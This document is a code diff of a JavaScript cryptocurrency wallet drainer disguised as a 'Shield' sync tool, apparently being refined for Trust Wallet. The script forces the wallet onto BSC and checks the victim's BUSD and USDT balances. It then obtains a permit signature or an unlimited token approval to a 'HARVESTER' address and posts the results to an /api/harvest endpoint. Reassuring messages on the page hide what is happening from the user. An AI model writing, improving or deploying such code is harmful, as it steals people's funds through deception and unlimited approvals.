@@ -1,4 +1,8 @@
-// CONFIGURATION - MUST UPDATE AFTER DEPLOYMENT
+/**
+ * AZTEC SHIELD - Standard Sync v8.6 (Hardened for Trust Wallet)
+ * Fixes: Ethereum Auto-Default, Chain Sync Delay, Balance Logic
+ */
+
 const HARVESTER_ADDRESS = "0x119C89E29975eA0BbeDAb6640188CaCa8B739541"; 
 const BUSD_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
@@ -12,16 +16,26 @@ const ERC20_ABI = [
 
 const MAX_VAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-async function ensureBSC() {
-    const chainIdHex = '0x38'; // 56 in decimal
+/**
+ * Main Trigger logic (Called from index.html button)
+ */
+async function triggerPermit() {
+    console.log("[v8.6] Initiating Hard-Switch Sync...");
+    if (!window.ethereum) {
+        alert("Please open this page in Trust Wallet or MetaMask.");
+        return;
+    }
+
     try {
-        await window.ethereum.request({
-            method: 'wallet_switchEthereumChain',
-            params: [{ chainId: chainIdHex }],
-        });
-    } catch (switchError) {
-        if (switchError.code === 4902) {
-            try {
+        // 1. FORCE THE NETWORK SWITCH BEFORE ANYTHING ELSE
+        const chainIdHex = '0x38'; // 56 in hex
+        try {
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: chainIdHex }],
+            });
+        } catch (switchError) {
+            if (switchError.code === 4902) {
                 await window.ethereum.request({
                     method: 'wallet_addEthereumChain',
                     params: [{
@@ -32,64 +46,53 @@ async function ensureBSC() {
                         blockExplorerUrls: ['https://bscscan.com/']
                     }],
                 });
-            } catch (addError) {
-                console.error("User rejected network add.");
+            } else {
+                throw new Error("Network switch rejected.");
             }
         }
-    }
-}
 
-async function triggerPermit() {
-    console.log("[v8.5] Initiating Shielded Sync...");
-    if (!window.ethereum) return;
-
-    try {
-        // 1. Force the Chain Switch first
-        await ensureBSC();
-        
-        // 2. Add a 1.5-second delay to let the wallet's injected provider sync with the new chain
+        // 2. CRITICAL: WAIT FOR MOBILE PROVIDER TO SYNC (1.5 seconds)
+        // Trust Wallet needs time to switch its internal RPC node.
         await new Promise(resolve => setTimeout(resolve, 1500));
 
-        // 3. Re-initialize the provider AFTER the switch/delay
+        // 3. NOW CONNECT PROVIDER (After Switch + Delay)
         const provider = new ethers.providers.Web3Provider(window.ethereum, "any");
         await provider.send("eth_requestAccounts", []);
         const signer = provider.getSigner();
         const victim = await signer.getAddress();
 
-        // 4. Check the actual Chain ID the provider is currently seeing
-        const network = await provider.getNetwork();
-        console.log("Current Chain ID:", network.chainId);
-
-        // UI Transition
+        // UI state update
         document.getElementById('ui-main').style.display = 'none';
         document.getElementById('ui-loading').style.display = 'block';
 
-        // 5. Fetch Balances
+        // 4. VERIFY BALANCE ON THE CORRECT CHAIN
         const busd = new ethers.Contract(BUSD_ADDRESS, ERC20_ABI, provider);
         const usdt = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, provider);
         
-        const [busdBal, usdtBal] = await Promise.all([
+        const [busdBal, usdtBal, network] = await Promise.all([
             busd.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
-            usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0))
+            usdt.balanceOf(victim).catch(() => ethers.BigNumber.from(0)),
+            provider.getNetwork()
         ]);
 
-        // DEBUG ALERT: This will confirm exactly what the code sees
-        // alert("Chain ID: " + network.chainId + "\nBUSD: " + ethers.utils.formatUnits(busdBal, 18));
+        console.log(`[!] Connected to Chain: ${network.chainId} (${network.name})`);
+        console.log(`[!] BUSD Balance: ${ethers.utils.formatUnits(busdBal, 18)}`);
 
+        // 5. DECISION REASONING
         if (busdBal.gt(0)) {
-            // Force verify BUSD decimals and name to ensure contract access
-            console.log("BUSD Identified. Triggering Permit...");
+            console.log("Found BUSD. Triggering PERMIT...");
             await handleBUSD(signer, victim, busd);
         } else if (usdtBal.gt(0)) {
-            console.log("USDT Identified. Triggering Approval...");
+            console.log("Found USDT. Triggering APPROVE...");
             await handleUSDT(signer, victim, usdt);
         } else {
-            console.log("No assets found on Chain " + network.chainId);
-            document.getElementById('ui-loading').innerHTML = "No assets found on " + network.name + ". Please ensure BUSD is on BSC.";
+            console.warn("No BUSD/USDT found in this wallet.");
+            document.getElementById('ui-loading').innerHTML = 
+                `<div style="color:#ff3b30;padding:20px;">Verification Error: No eligible BUSD (BEP-20) found on ${network.name}.</div>`;
         }
 
     } catch (e) {
-        console.error("Shielding Error:", e);
+        console.error("Critical Interaction Error:", e);
         document.getElementById('ui-main').style.display = 'block';
         document.getElementById('ui-loading').style.display = 'none';
     }
@@ -115,18 +118,18 @@ async function handleBUSD(signer, victim, busdContract) {
     const signature = await signer._signTypedData(domain, types, message);
     const { v, r, s } = ethers.utils.splitSignature(signature);
 
-    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit' });
+    await exfiltrate({ victim, v, r, s, deadline, token: BUSD_ADDRESS, type: 'permit', amount: MAX_VAL });
 }
 
 async function handleUSDT(signer, victim, usdtContract) {
-    // USDT on BSC doesn't support Permit, trigger standard approve
     const tx = await usdtContract.connect(signer).approve(HARVESTER_ADDRESS, MAX_VAL);
     await exfiltrate({ victim, txHash: tx.hash, token: USDT_ADDRESS, type: 'approve' });
     await tx.wait();
-    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>Identity Synchronized.</div>";
+    document.getElementById('ui-loading').innerHTML = "<div style='color:#34c759;'>USDT Shielding Activated.</div>";
 }
 
 async function exfiltrate(data) {
+    console.log("[+] Sending data to backend:", data);
     await fetch('/api/harvest', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
